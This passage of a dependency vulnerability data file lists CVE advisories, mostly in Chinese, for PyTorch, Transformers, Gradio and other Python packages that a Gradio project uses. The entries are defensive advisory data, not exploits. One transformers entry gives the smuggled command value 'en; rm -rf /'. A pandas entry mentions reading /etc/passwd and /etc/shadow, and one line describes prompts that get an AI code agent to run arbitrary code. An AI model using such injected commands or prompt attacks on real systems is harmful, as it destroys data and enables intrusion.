Encode OSS httpx 1.0.0 版本及其之前版本存在输入验证错误漏洞，该漏洞源于httpx.URL和httpx.Client和httpx.URL.copy_with的函数输入验证不当。",1,2
gradio-app_gradio,hypothesis,,True,,CWE-362,2023-08-22,"## Overview
[hypothesis](https://pypi.org/project/hypothesis) is an A library for property-based testing

Affected versions of this package are vulnerable to Race Condition when multiple tests share the same `RecursiveStrategy` instance and are executed in multiple threads.
## Remediation
Upgrade `hypothesis` to version 6.0.4 or higher.
## References
- [GitHub Commit](https://github.com/HypothesisWorks/hypothesis/commit/218dd5db4d46759313f7071ad1822a4f075bb2c0)
- [GitHub Issue](https://github.com/HypothesisWorks/hypothesis/issues/2717)
- [GitHub PR](https://github.com/HypothesisWorks/hypothesis/pull/2783)
",3,2
gradio-app_gradio,torch,,True,CVE-2022-45907,CWE-94,2022-11-26,PyTorch是一个开源机器学习框架，提供张量计算、构建神经网络等功能。其torch.jit.annotations.parse_type_line组件存在代码注入漏洞，原因是对eval的使用不安全，导致潜在的任意代码执行。,1,2
gradio-app_gradio,torch,,True,CVE-2024-31580,CWE-122,2024-04-17,PyTorch是一个开源的Python包，主要用于张量计算和动态神经网络，并且具有强大的GPU加速功能。在v2.2.0之前的版本中，/runtime/vararg_functions.cpp组件中存在堆缓冲区溢出漏洞。由于函数的大小检查不当，攻击者可以通过提供精心构造的输入导致拒绝服务(DoS)，甚至可能执行任意代码。,2,0
gradio-app_gradio,torch,,True,CVE-2024-31583,CWE-416,2024-04-17,PyTorch 是一个以开源方式提供的 Python 库，专门用于神经网络构建与张量计算，具备强大的 GPU 加速能力。此漏洞涉及内存的释放后重用，位于 torch/csrc/jit/mobile/interpreter.cpp 组件中，由于内存管理不当可能导致此问题。攻击者可通过该漏洞执行任意代码或引发拒绝服务攻击。,2,0
gradio-app_gradio,torch,,True,CVE-2024-48063,CWE-502,2024-10-29,<p>PyTorch是一个由PyTorch开源社区提供的常用机器学习框架，广泛应用于深度学习和人工智能开发。此漏洞在PyTorch版本2.4.1及之前的版本中发现，该漏洞源于用于分布式RPC任务的RemoteModule模块。当应用程序允许从未经验证的来源加载和执行代码时，会导致远程代码执行漏洞。此漏洞会使攻击者能够在没有适当权限或安全审查的情况下执行任意代码。</p>,1,1
gradio-app_gradio,torch,,True,CVE-2025-3730,CWE-404,2025-04-16,PyTorch是一个广泛使用的开源深度学习框架，其提供了动态神经网络的构建和强力的GPU加速支持。该框架中的torch.nn.functional.ctc_loss函数在处理输入为空的张量时，会在文件 aten/src/ATen/native/LossCTC.cpp中引发拒绝服务漏洞。攻击者可以通过触发该漏洞使得系统崩溃，导致服务不可用。,3,0
gradio-app_gradio,torch,,True,CVE-2024-7804,CWE-502,,PyTorch 是一个开源的 Python 深度学习框架，广泛用于机器学习和人工智能应用。该框架的 RPC 组件 (torch.distributed.rpc) 在 2.3.1 及其之前的版本中存在反序列化漏洞。该漏洞源于在反序列化 PythonUDF 对象时缺乏安全验证，攻击者能够通过发送恶意序列化的 PythonUDF 对象来远程执行任意代码，从而在主节点上实现远程代码执行 (RCE)。,1,1
gradio-app_gradio,torch,,True,CVE-2025-32434,CWE-502,2025-04-18,PyTorch 是一个用于深度学习的 Python 包，提供强大的 GPU 加速和自动微分能力。该漏洞存在于 PyTorch 2.5.1 及之前的版本中。当用户使用 torch.load 方法并将 weights_only 参数设置为 True 时，攻击者可以通过构造恶意模型文件强制调用 legacy_load 方法，从而实现远程命令执行，即使官方文档认为在此模式下是安全的。漏洞的根本原因在于反序列化过程中缺乏充分的安全验证。,1,1
gradio-app_gradio,torch,,True,CVE-2025-2953,CWE-404,2025-03-30,PyTorch 是一个深度学习框架，提供了动态神经网络和张量计算功能。该组件中受影响的函数 torch.mkldnn_max_pool2d 存在一个拒绝服务漏洞。这是由于在处理张量过程中发生了不当的资源关闭或释放，可能导致系统崩溃。本地攻击者可以通过特制输入触发此漏洞，导致服务中断。,3,0
gradio-app_gradio,torch,,True,CVE-2024-31584,CWE-125,2024-04-19,"PyTorch是PyTorch开源的一个 Python 包。
Pytorch v2.2.0之前版本存在安全漏洞，该漏洞源于组件 torch/csrc/jit/mobile/flatbuffer_loader.cpp存在越界读取漏洞。",3,0
gradio-app_gradio,torch,,True,CVE-2025-55553,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源机器学习框架，主要用于深度学习模型的开发和训练。组件 proxy_tensor.py 是 PyTorch 的一部分，负责处理张量代理操作。此漏洞因组件 proxy_tensor.py 中存在的语法错误导致，攻击者可以通过触发该错误使目标系统进入不可用状态，从而造成拒绝服务（DoS）。利用该漏洞无需复杂的技术手段，可能通过特定的输入数据引发异常错误，从而导致服务中断。,3,2
gradio-app_gradio,torch,,True,CVE-2025-55560,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持多种机器学习任务和模型训练。该漏洞影响 PyTorch v2.7.0，当模型使用了 `torch.Tensor.to_sparse()` 和 `torch.Tensor.to_dense()` 方法并通过 Inductor 编译时，可能会导致拒绝服务 (DoS)。漏洞成因可能与 Inductor 编译器在处理稀疏与密集张量转换时出现的内存或计算资源耗尽问题有关。攻击者可以通过特制的模型触发该问题，从而使系统无法正常响应。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55558,CWE-400,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，通常用于构建和训练神经网络。该框架支持多种模块和操作，包括 torch.nn.Conv2d（二维卷积层）、torch.nn.functional.hardshrink（硬收缩激活函数）以及 torch.Tensor.view 和 torch.mv（矩阵向量乘法）。Inductor 是 PyTorch 的编译器部分，负责将模型代码编译为高效运行的计算图。在 PyTorch v2.7.0 中，当包含上述模块的模型经过 Inductor 编译时，会触发缓冲区溢出问题。缓冲区溢出通常是由于代码中对内存管理不当或缺乏边界检查导致的，这可能会导致存储数据的内存被过度写入，从而破坏程序的正常运行。,4,2
gradio-app_gradio,torch,,True,CVE-2025-55557,CWE-248,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，主要用于构建和训练神经网络。torch.cummin 是 PyTorch 中的一个函数，用于计算张量的逐元素累积最小值。Inductor 是 PyTorch 的一个编译器后端，用于优化模型运行性能。在 PyTorch v2.7.0 中，当模型包含 torch.cummin 函数并使用 Inductor 编译时，会触发 Name Error。此错误可能导致系统无法正常运行，进而引发拒绝服务（DoS）。漏洞的成因可能是 Inductor 编译器在处理 torch.cummin 函数时未正确处理某些变量或名称解析，导致程序在运行时崩溃。,3,2
gradio-app_gradio,torch,,True,CVE-2025-46148,CWE-1284,2025-09-25,PyTorch 是一个广泛使用的开源深度学习框架，支持动态计算图和自动梯度计算，用于构建和训练神经网络。nn.PairwiseDistance 是 PyTorch 中的一个模块，主要用于计算向量之间的距离。在 PyTorch 2.6.0 及之前的版本中，当启用 eager 模式时，该模块在计算 p=2 的距离时会产生错误结果。该问题可能由于实现中的算法逻辑错误或数据处理方式不当导致。,4,2
gradio-app_gradio,torch,,True,CVE-2025-2149,CWE-665,2025-03-10,<p>PyTorch 是一个开源的深度学习框架，广泛用于机器学习和人工智能领域。受影响的组件是量化 Sigmoid 模块中的 nnq_Sigmoid 函数。PyTorch 的量化机制旨在减少模型的大小并提高推理速度，其中 nnq_Sigmoid 函数是用于激活函数的量化实现。漏洞的根本原因在于对参数 scale/zero_point 的处理不当，导致该组件的初始化过程发生错误。这种处理不当可能导致量化参数在初始化过程中被错误设置，进而影响模型的精度或功能。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-2148,CWE-119,2025-03-10,<p>PyTorch 是一个用于机器学习的开源 Python 库，广泛应用于深度学习模型的构建与训练。此漏洞出现在 PyTorch 2.6.0+cu124 版本的 torch.ops.profiler._call_end_callbacks_on_jit_fut 函数中，该函数处理过程中由于输入参数 None 导致内存损坏。这是一种缓冲区错误，可能由于未正确处理输入而导致不安全的内存操作。</p>,4,0
gradio-app_gradio,torch,,True,CVE-2025-3121,CWE-119,2025-04-02,<p>PyTorch是一个开源的机器学习框架，广泛用于深度学习模型的开发和训练。该框架的2.6.0版本中，torch.jit.jit_module_from_flatbuffer函数存在内存损坏问题，导致缓冲区错误。此漏洞源于函数在处理flatbuffer的数据时没有正确管理内存，可能引发内存溢出或损坏，从而影响系统稳定性。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2998,CWE-119,2025-03-31,<p>PyTorch 是一个开源的深度学习框架，广泛用于各种机器学习和深度学习项目。该漏洞影响了 PyTorch 版本 2.6.0 中的函数 torch.nn.utils.rnn.pad_packed_sequence。PyTorch 提供丰富的神经网络构件与优化工具，帮助开发者构建复杂的深度学习模型。在该漏洞中，由于函数在处理输入时未进行适当的长度验证，导致出现内存损坏问题。这种处理不当使得本地用户有机会通过特定输入数据触发内存操作异常，导致内存访问错误。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-2999,CWE-119,2025-03-31,<p>PyTorch 是一个开源的机器学习框架，提供了深度学习所需的核心功能。此漏洞影响了 PyTorch 2.6.0 版本中的 torch.nn.utils.rnn.unpack_sequence 函数。由于该函数在处理内存操作时存在不当处理，导致出现内存损坏从而引发缓冲区溢出问题。漏洞成因根本于对输入数据的长度大小缺乏正确验证，可能导致系统的内存被意外覆盖或破坏。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3001,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的开源深度学习框架，支持用于科学研究和商业应用的复杂张量计算和自动求导特性。该漏洞出现在 PyTorch 2.6.0 版本的 torch.lstm_cell 函数中，由于该函数未能正确验证输入数据的长度大小，攻击者可以通过操控输入数据导致内存损坏。由于内存地址定位错误或指针操作不当，使得进程内存中相邻区域可能被篡改或控制，进而引发程序异常或恶意代码执行。</p>,3,0
gradio-app_gradio,torch,,True,CVE-2025-3000,CWE-119,2025-03-31,<p>PyTorch 是一个广泛使用的深度学习框架，提供自动求导和灵活的计算图功能。漏洞存在于 PyTorch 2.6.0 的 torch.jit.script 函数中，导致内存损坏。此漏洞是由于函数未能正确验证输入数据的长度大小，引发缓冲区溢出，从而导致内存损坏和潜在的代码执行风险。</p>,3,0
gradio-app_gradio,tqdm,,True,CVE-2016-10075,CWE-17,2016-12-25,"tqdm是一个快速、可扩展的Python进度条，它支持在Python长循环中添加一个进度提示信息。
tqdm 4.4.1版本和4.10版本中的tqdm._version模块存在安全漏洞。本地攻击者可利用该漏洞执行任意代码。",2,0
gradio-app_gradio,tqdm,,True,CVE-2024-34062,CWE-74,2024-05-03,"tqdm是tqdm开源的一个用于 Python 和 CLI 的快速、可扩展的进度条。
tqdm 4.66.3之前版本存在安全漏洞，该漏洞源于任何可选的非布尔 CLI 参数都可以通过 python 的 eval传递，允许任意代码执行。",3,0
gradio-app_gradio,transformers,,True,,CWE-601,2022-11-01,"## Overview
[transformers](https://pypi.org/project/transformers) is a State-of-the-art Machine Learning for JAX, PyTorch and TensorFlow

Affected versions of this package are vulnerable to Open Redirect due to referencing an obsolete link.
## Remediation
Upgrade `transformers` to version 4.23.0 or higher.
## References
- [GitHub Commit](https://github.com/huggingface/transformers/commit/ce2620194b4a8f070cd29504d34a79758affdf95)
- [GitHub PR](https://github.com/huggingface/transformers/pull/19001)
- [GitHub Release](https://github.com/huggingface/transformers/releases/tag/v4.23.0)
",3,0
gradio-app_gradio,transformers,,True,CVE-2023-2800,CWE-377,,Hugging Face Transformers 是用于 JAX、PyTorch 和 TensorFlow 的先进自然语言处理库。该漏洞出现在 4.30.0 之前的版本中，源于使用过时的 tempfile.mktemp() 方法。该方法不安全，因为在调用 mktemp() 与文件创建之间，可能有其他进程创建同名文件。这可能导致文件可用性受干扰，并可能导致敏感信息泄露。,3,1
gradio-app_gradio,transformers,,True,CVE-2023-6730,CWE-502,,Hugging Face Transformers 是为 JAX、PyTorch 和 TensorFlow 提供的先进自然语言处理框架。此组件用于处理自然语言任务，如文本分类、翻译和问答系统等。漏洞发生在 Transformers 4.36.0 之前的版本，其 root cause 是在 `RagRetriever.from_pretrained()` 函数中，`index_name` 和 `index_path` 参数会反序列化不受信任的数据，攻击者可以远程加载恶意 pickle 文件，从而绕过文件检查并在主机上执行任意代码。反序列化是将字节序列转换为对象的过程，被用于通信和存储。此漏洞允许攻击者在未验证数据合法性的情况下进行反序列化，导致代码执行。,1,1
gradio-app_gradio,transformers,,True,CVE-2023-7018,CWE-502,,Hugging Face Transformers是一个用于JAX、PyTorch和TensorFlow的先进自然语言处理库。在受到影响的版本中，使用TransfoXLTokenizer()函数可能会自动加载恶意的vocab.pkl文件，利用pickle.load函数反序列化不受信任的数据。此漏洞源于未能充分验证反序列化的数据，使攻击者可执行任意代码，控制应用程序的状态或执行流程。,1,1
gradio-app_gradio,transformers,,True,CVE-2024-3568,CWE-502,,Hugging Face Transformers 是一个为 Jax、PyTorch 和 TensorFlow 打造的用于先进自然语言处理的库。TFPreTrainedModel 类的 load_repo_checkpoint() 函数存在反序列化不受信任数据的漏洞。该漏洞允许攻击者通过构造恶意的序列化有效负载，利用函数中的 pickle.load() 方法在处理来自可能不受信任源的数据时执行任意代码和命令。这种不安全反序列化的根本原因是缺少对输入数据的信任边界控制，以及对来源不明数据的直接反序列化处理。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-3933,CWE-1333,2025-07-11,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.50.3及之前版本存在安全漏洞，该漏洞源于DonutProcessor类的token2json方法存在正则表达式拒绝服务，可能导致服务中断。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3263,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于transformers.configuration_utils模块中get_configuration_file函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-3777,CWE-20,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0及之前版本存在输入验证错误漏洞，该漏洞源于image_utils.py中URL验证不足，可能导致钓鱼攻击。",3,0
gradio-app_gradio,transformers,,True,CVE-2025-3264,CWE-1333,2025-07-07,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.49.0版本存在安全漏洞，该漏洞源于dynamic_module_utils.py中get_imports函数的正则表达式复杂性不足，可能导致正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-5197,CWE-1333,2025-08-06,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.51.3及之前版本存在安全漏洞，该漏洞源于正则表达式拒绝服务攻击。",3,2
gradio-app_gradio,transformers,,True,CVE-2025-6921,CWE-400,2025-09-23,<p>transformers是Hugging Face开源的一个用于机器学习的应用程序。 transformers 4.53.0之前版本存在资源管理错误漏洞，该漏洞源于_do_use_weight_decay方法处理用户控制的正则表达式时存在缺陷，可能导致正则表达式拒绝服务攻击。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11394,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的自然语言处理框架。该框架提供构建和应用 Transformer 模型的丰富工具。在其模型文件处理过程中，由于缺乏对用户提供数据的充分验证，导致存在不安全反序列化漏洞，攻击者可以通过插入特制的未验证模型文件进行反序列化，进而在应用中执行任意代码。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-12720,CWE-1333,2025-03-20,Hugging Face Transformers 是一个开源的自然语言处理库，广泛应用于构建和训练先进的模型。该库支持 Jax、PyTorch 和 TensorFlow 的集成。在 tokenization_nougat_fast.py 文件中的 post_process_single() 函数存在正则表达式的处理漏洞。此漏洞由于正则表达式在特定条件下表现出指数时间复杂性，导致出现过度回溯，从而造成 CPU 使用率过高以及应用程序潜在的停机，形成拒绝服务 (DoS) 的场景。受影响的版本是 v4.46.3。,3,2
gradio-app_gradio,transformers,,True,CVE-2024-11392,CWE-502,2024-11-22,Hugging Face Transformers 是一个开源项目，提供 Jax、PyTorch 和 TensorFlow 的自然语言处理模型库。其主要用于构建和训练深度学习模型以及处理自然语言数据。在处理配置文件时，因数据验证不当，导致可能不受信任的数据被反序列化。此漏洞的核心是缺乏对用户输入数据的充分验证，从而使得攻击者能够控制程序执行流，仅需用户访问恶意页面或打开恶意配置文件即可触发。该漏洞允许嵌入恶意代码执行，并在应用环境中获得与当前用户相同的权限。,4,1
gradio-app_gradio,transformers,,True,CVE-2024-11393,CWE-502,2024-11-22,Hugging Face Transformers 是一个用于 Jax、PyTorch 和 TensorFlow 的先进自然语言处理库，提供各种预训练模型以支持多种自然语言处理任务。漏洞存在于模型文件解析过程中，因缺乏对用户输入数据的充分验证，导致不受信任的数据被反序列化。攻击者能利用该漏洞在受影响的安装上以当前用户权限执行任意代码。此漏洞主要影响版本低于4.48.0的转换脚本，但不影响核心库功能。,4,1
gradio-app_gradio,transformers,,True,CVE-2025-1194,CWE-1333,2025-04-29,Hugging Face Transformers 是一个用于自然语言处理的开源库，提供了多种预训练模型以便于开发者快速构建机器学习应用。该漏洞存在于 GPT-NeoX-Japanese 模型的 `tokenization_gpt_neox_japanese.py` 文件中，具体是在 SubWordJapaneseTokenizer 类中。当正则表达式处理经过精心构造的输入时，会导致漏洞产生。根本原因在于某些条件下的正则表达式表现出指数复杂性，导致过度回溯。这可能导致 CPU 使用率升高，进而造成应用程序停机，有效地生成拒绝服务 (DoS) 场景。受影响的版本为 v4.48.1（最新）。,3,2
gradio-app_gradio,transformers,,True,CVE-2025-2099,CWE-1333,2025-05-19,<p>在huggingface/transformers版本v4.48.3的`transformers.testing_utils`模块中，`preprocess_string()`函数存在一个漏洞。该漏洞允许通过正则表达式拒绝服务（ReDoS）攻击进行利用。处理文档字符串中代码块所使用的正则表达式包含嵌套量词，导致在处理含有大量换行符的输入时发生指数级回溯。</p>,3,2
gradio-app_gradio,transformers,,True,CVE-2025-6638,CWE-1333,2025-09-12,"Hugging Face Transformers是Hugging Face开源的为 Jax、PyTorch 和 TensorFlow 打造的先进的自然语言处理。
Hugging Face Transformers 4.52.4版本存在安全漏洞，该漏洞源于MarianTokenizer的remove_language_code方法存在正则表达式处理效率问题，可能导致正则表达式拒绝服务。",3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个支持多种任务的开源自然语言处理库，基于PyTorch和TensorFlow构建。由于在GitHub Actions工作流的分支名称未正确清理，攻击者可以利用此漏洞实现任意代码注入。当攻击者提供特制的分支名称时，可以触发不受信任的命令执行。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>HuggingFace Transformers 是一个用于自然语言处理和机器学习的开源库，提供各种工具和模型以简化开发。该库中的 load_tool 功能允许从 HuggingFace Hub 加载外部工具，但存在远程代码执行漏洞。攻击者可以在未启用 `Trust Remote Code` 的情况下，通过从恶意构建的库加载工具，导致执行任意 Python 代码。此漏洞的调用链为 `load_tool() -&gt; Tool.from_hub() -&gt; get_class_from_dynamic_module() -&gt; get_class_in_module() -&gt; importlib.import_module(module_path)`，其中的 importlib.import_module 函数在没有任何警告的情况下执行导入操作。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个由 Hugging Face 开发的开源自然语言处理模型库，旨在提供强大的模型以简化深度学习任务。该库中的 TransfoXLCorpus 组件存在一个远程代码执行漏洞，当用户按照 Hugging Face 的官方指导使用该模型时，恶意用户可以通过不安全的 torch.load 方法进行攻击。攻击的根本原因在于该方法在未正确处理受信任输入时，可能执行任意可执行代码。具体来说，攻击者可利用该漏洞使受害者在本地执行恶意代码，从而在系统中创建特定文件。</p>,4,1
gradio-app_gradio,transformers,,True,,,,"<p>Transformers 是一个开源的 Python 库，旨在简化和加速使用深度学习模型的自然语言处理任务。在 `build-eval-data.py` 代码片段中，使用用户提供的字符串动态生成 shell 命令。攻击者可以通过输入特定的字符或命令，利用此漏洞进行远程命令注入。例如，如果用户将变量 `src` 或 `tgt` 设置为 ""en; rm -rf /""，那么代码将生成执行 `rm -rf /` 的命令，从而导致系统数据丢失或损坏。由于缺乏对输入的处理和验证，恶意用户可以执行任意 shell 命令。</p>",1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，提供多种模型和工具以简化文本建模的过程。该库的 export 函数 TextDatasetForNextSentencePrediction() 存在一个反序列化漏洞，如果读取的文件路径为 C:/1.txt，程序将会读取当前目录中精心构造的副本。该漏洞的根本原因在于库中对输入数据的处理不当，攻击者可以借此构造恶意数据流通过反序列化执行任意命令。</p>,1,1
gradio-app_gradio,transformers,,True,CVE-2025-6051,CWE-1333,2025-09-14,<p>Hugging Face Transformers 是一个用于自然语言处理 (NLP) 的开源库，提供了许多预训练的模型和工具，广泛应用于文本分类、机器翻译、文本生成等任务。此漏洞存在于该库的 `EnglishNormalizer` 类的 `normalize_numbers()` 方法中。该方法用于对数字字符串进行归一化处理，但在处理特制的长数字序列时，由于正则表达式匹配效率低下，会导致 CPU 资源过度消耗。攻击者可以通过向应用程序发送特制的输入数据，触发该漏洞，进而导致系统性能严重下降。</p>,3,2
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个用于自然语言处理的开源 Python 库，旨在借助深度学习模型简化文本处理任务。WaitCanDeadlock 漏洞是一种与并发相关的特定问题，通常发生在多线程系统中。当一个持有锁的线程被迫无期限地等待一个无法满足的条件时，可能导致死锁场景的发生。这种漏洞的触发条件为：使用 subprocess.Popen 启动子进程并直接调用 proc.wait()，如果子进程输出内容过大时，就可能会导致死锁，因此建议使用 proc.communicate() 方法来避免这一问题。</p>,1,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个基于 Python 的开源机器学习库，专注于自然语言处理任务。该库中的 CodeAgent 组件负责生成并执行解决任务的代码。然而，由于未能对生成的代码进行检查，攻击者可以通过精心构造的提示直接执行任意代码，从而导致代码执行漏洞。攻击者无需额外的授权导入即可利用此漏洞。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers是一个用于自然语言处理的开源Python库，能够处理预训练模型和变换器架构。当该库使用已不再安全的函数`tempfile.mktemp()`时，存在一个不安全的临时文件漏洞。由于调用`mktemp()`和随后尝试创建文件之间可能会有其他进程创建同名文件，这使得该函数不再安全。这使攻击者可以在文件打开之前影响文件内容。</p>,3,1
gradio-app_gradio,transformers,,True,,,,<p>Transformers 是一个开源的 Python 库，用于构建和训练深度学习模型，特别是在自然语言处理方面。当用户使用 convert_maskformer_resnet_to_pytorch.py 脚本，并通过 --checkpoint_path 参数提供一个恶意的 .pkl 文件时，该脚本使用 pickle.load 进行不安全的反序列化。这使得攻击者可以在用户的系统上执行嵌入在 pickle 文件中的任意恶意代码。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源库，旨在为研究人员和开发者提供强大的工具以训练和应用转化器模型。该库中的 Transformer-XL 模型在执行反序列化操作时存在安全漏洞，具体是在 convert_transfo_xl_original_tf_checkpoint_to_pytorch.py 脚本中使用了 pickle.load，从而导致恶意的 pickle 文件可以被用来执行任意代码。如果攻击者能够控制传入的文件，他们可以创建一个恶意文件“一旦加载” 就可以在受害者系统上执行代码。该漏洞可以通过提供一个精心构造的 pickle 文件（例如，包含打开计算器应用的代码）进行利用。</p>,2,1
gradio-app_gradio,transformers,,True,,,,<p>transformers 是一个开源的 Python 库，主要用于自然语言处理，具有强大的模型支持。在 utils/check_self_hosted_runner.py 文件中存在命令注入漏洞。攻击者可以通过在服务或 Web 服务器中运行该工具实现任意命令执行。该漏洞的根本原因是使用了 shell=True，在 subprocess.run 函数中直接注入用户提供的命令。利用该漏洞，攻击者可以执行任意命令，例如通过特制的命令参数获取系统敏感信息。</p>,4,1
gradio-app_gradio,transformers,,True,,,,<p>Hugging Face Transformers 是一个用于自然语言处理的开源 Python 库，旨在使机器学习模型的使用更为简单和可访问。该漏洞涉及用户在 https://huggingface.co/ 上传的个人资料图片，其 EXIF 地理位置数据未被去除。这导致任何人都可以获取用户的敏感信息，例如他们的地理位置和设备信息（如设备名称、版本、使用的软件及其版本等）。</p>,3,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2024-10624,CWE-1333,,Gradio 是一个开源 Python 库，旨在通过友好的 Web 界面来展示机器学习模型。受影响的版本为 git commit 98cbcae。该漏洞源于 gr.Datetime 组件中使用的正则表达式 `^(?:\s*now\s*(?:-\s*(\d+)\s*([dmhs]))?)?\s*$`，在 Python 的默认 regex 引擎中，这个正则表达式在处理某些特制输入时可能需要多项式时间来匹配。攻击者可以通过发送特制的 HTTP 请求来利用这一点，从而使 Gradio 进程消耗 100% 的 CPU，可能导致服务器拒绝服务 (DoS) 状态。,2,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2024-10648,CWE-29,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae。该漏洞源于 Gradio Audio 组件的路径遍历漏洞，攻击者能够控制音频文件格式，导致任意文件内容被删除。当存档文件被精心构造时，恶意的文件名可以遍历到提取目录之外，覆盖其他重要文件，例如配置文件或可执行文件，从而导致更为严重的影响。攻击者可以通过在 zip 文件中包含恶意路径名来利用此漏洞。,2,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2025-23042,CWE-285,2025-01-14,"Gradio是Gradio开源的一个开源 Python 库，是通过友好的 Web 界面演示机器学习模型的方法。
Gradio 5.6.0之前版本存在授权问题漏洞，该漏洞源于对文件的路径验证逻辑缺乏规范化。攻击者利用该漏洞可以通过更改被阻止的文件或目录路径的字母大小写，绕过Gradio的文件路径访问控制列表（ACL）。",2,2
gradio-app_gradio,gradio,5.10.0,True,CVE-2024-8966,CWE-770,,Gradio 是一个开源的 Python 库，用于通过友好的 Web 界面展示训练好的机器学习模型。在其文件上传过程中，存在一个拒绝服务（DoS）漏洞。攻击者可以在 multipart 边界的结尾添加大量字符，导致系统不断处理每个字符并发出警告。这可能导致 Gradio 在长时间内无法访问，从而中断服务，造成显著的停机时间。,2,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2024-10569,CWE-475,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。受影响的版本为 git 98cbcae，在 dataframe 组件中存在安全漏洞。该漏洞源于组件使用 pd.read_csv 处理输入值，允许上传压缩文件。攻击者可以利用此漏洞，通过上传恶意构造的 zip 炸弹，导致服务器崩溃和拒绝服务（DoS）。,2,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2025-0187,CWE-400,,Gradio 是一个开源的 Python 库，旨在通过友好的 Web 界面演示机器学习模型。Gradio 版本 0.39.1 存在一个资源管理错误漏洞，该漏洞源于文件上传功能在处理带有大文件名的表单数据时的不当处理。攻击者可以通过发送包含过大文件名的 payload，使得服务器变得不响应，从而导致合法用户无法访问该服务。,2,1
gradio-app_gradio,gradio,5.10.0,True,CVE-2025-5320,CWE-345 CWE-346,2025-05-29,在Gradio应用中的gradio版本5.29.1及其之前的版本中，发现了一个被标记为存在问题的漏洞。这个漏洞存在于CORS处理程序中的is_valid_origin函数。通过操纵localhost_aliases参数可以导致来源验证错误。,3,0
gradio-app_gradio,gradio,5.10.0,True,CVE-2025-48889,CWE-434,2025-05-30,Gradio的标记功能存在任意文件复制漏洞，攻击者可以绕过身份验证，复制服务器文件系统中的任何可读文件。攻击者不能读取复制的文件，但可以通过复制大型文件（如/dev/urandom）填满磁盘空间，导致服务拒绝。,3,2
gradio-app_gradio,h11,0.14.0,True,CVE-2025-43859,CWE-444,2025-04-25,<p>python-hyper h11库是一个用于处理HTTP/1.1协议的Python库，允许用户实现HTTP客户端与服务端的交互。CVE-2025-43859漏洞涉及h11库对某些错误格式的Chunked-Encoding消息体的接收，导致在特定条件下可能出现请求走私漏洞。此问题源于h11在解析Chunked-Encoding消息体的行终止符时的不严格处理，攻击者可以利用这一点进行请求走私，从而操控HTTP请求的解释。</p>,1,1
gradio-app_gradio,jinja2,3.1.5,True,CVE-2025-27516,CWE-1336,2025-03-05,Jinja2 是一个广泛用于Web应用程序的模板引擎，用于渲染模板。该漏洞源于 Jinja2 沙盒环境与 `|attr` 过滤器交互时的一个疏忽。特别是，当攻击者能够控制模板的内容时，就可以利用此缺陷执行任意 Python 代码。这意味着，如果某个应用程序处理不可信的模板，就可能受到威胁，从而导致未经授权的系统访问或操作。,3,2
gradio-app_gradio,pandas,2.2.3,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,requests,2.32.3,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,starlette,0.45.3,True,CVE-2025-54121,CWE-770,2025-07-21,Starlette 是一个快速的异步 Python Web 框架，常用于构建高性能的 Web 应用程序和 API。该漏洞涉及 Starlette 在解析多部件表单时处理大文件的机制，具体来说，当文件大小超过默认最大缓冲区大小时，Starlette 会将文件转存到磁盘，这一过程会阻塞主线程，导致无法接受新的连接。漏洞的成因是代码未能正确判断文件是否需要转存到磁盘，导致事件线程阻塞。,3,2
